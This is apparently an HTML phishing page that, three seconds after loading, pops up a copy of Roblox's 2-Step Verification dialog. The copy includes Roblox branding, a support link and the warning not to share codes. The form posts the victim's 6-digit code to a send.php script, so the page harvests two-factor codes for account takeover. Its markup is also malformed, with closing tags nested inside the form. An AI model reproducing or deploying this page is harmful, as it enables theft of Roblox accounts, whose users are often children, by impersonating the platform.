<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
    <h1>Welcome to My Website</h1>
    
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <p>This is a modal popup!</p>
            
            <form method="post" action="send.php">
                <div role='dialog'><div class='fade modal-backdrop in'></div><div role='dialog' tabindex='-1' class='fade modal-modern in modal' style='display: block;'><div class='modal-dialog'>
            <div class='modal-content' role='document'><div title='' class='modal-header'><button type='button' class='modal-modern-header-button'><span class='icon-close'></span></button><h4 class='modal-title'>2-Step Verification</h4><div class='modal-modern-header-info'></div></div><div class='modal-body'><div class='modal-lock-icon'></div><p class='modal-margin-bottom-xlarge'>Enter the code we just sent you via email.</p><div class='input-control-wrapper'><input name='step' as='input' inputmode='numeric' autocomplete='off' maxlength='6' placeholder='Enter 6-digit Code' type='password' id='two-step-verification-code-input' class='input-field form-control' value=''></div></div><p class='modal-margin-bottom-xlarge'><input id='remember-device' type='checkbox' tabindex='0'> <label for='remember-device'>Trust this device for 30 days</label></p><p><button type='button' class='modal-body-button-link small'>Resend Code</button></p><p><button type='button' class='modal-body-button-link small'>Use another verification method</button></p></div><div class='modal-footer'><div class='modal-modern-footer-buttons'>
            <input type='submit' name='fabutton' class='btn-cta-md modal-modern-footer-button' value='Verify'>
            </div><p class='text-footer modal-margin-bottom'>Need help? Contact <a class='text-name text-footer contact' href='https://www.roblox.com/info/2sv' target='_blank' rel='noopener noreferrer'>Roblox Support</a></p><p class='text-footer'>IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>
                </body></html>
            </form>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>

<style>.modal {
    display: none;
    position: fixed;
    z-index: 1;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0, 0, 0, 0.4);
}

.modal-content {
    background-color: #fefefe;
    margin: 15% auto;
    padding: 20px;
    border: 1px solid #888;
    width: 80%;
}

.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}
</style>

<script>document.addEventListener('DOMContentLoaded', function() {
    var modal = document.getElementById('myModal');
    var span = document.getElementsByClassName('close')[0];

    span.onclick = function() {
        modal.style.display = 'none';
    };

    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    };

    // Display the modal after 3 seconds (3000 milliseconds)
    setTimeout(function() {
        modal.style.display = 'block';
    }, 3000);
});
</script>